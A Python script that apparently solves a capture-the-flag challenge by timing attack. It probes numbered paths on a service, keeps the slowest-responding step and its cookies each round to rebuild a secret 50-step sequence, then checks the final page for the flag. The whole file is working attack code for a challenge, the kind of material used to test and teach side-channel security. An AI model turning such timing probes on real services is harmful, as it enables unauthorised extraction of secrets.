import time
import urllib.parse
import requests

flag = input()
service = input()


def get(step, cookies=None):
    start = time.time()
    r = requests.get(
        urllib.parse.urljoin(service, "/path/%s" % step),
        allow_redirects=False,
        cookies=cookies,
    )
    end = time.time()
    return end - start, r.cookies, step


def best(current, i):
    if current[0][2] == i:
        if abs(current[0][0] - current[1][0]) < 0.1:
            return current[1]
    return current[0]

get(1)
time.sleep(3)
# let the server warm up in case it was just started

unused = set([i for i in range(1, 51)])
current_cookies = None

for i in range(1, 51):
    current = []

    for j in unused:
        current.append(get(j, current_cookies))

    current.sort(reverse=True, key=lambda c: c[0])

    if i != 50:
        best_path = best(current, i)
        current_cookies = best_path[1]
        print(best_path[2])
        unused.remove(best_path[2])


r = requests.get(
    urllib.parse.urljoin(service, "/path/%s" % best(current, 50)[2]),
    cookies=current_cookies,
)
print(best(current, 50)[2])
print(r.text)
if flag in r.text:
    exit()
exit(1)
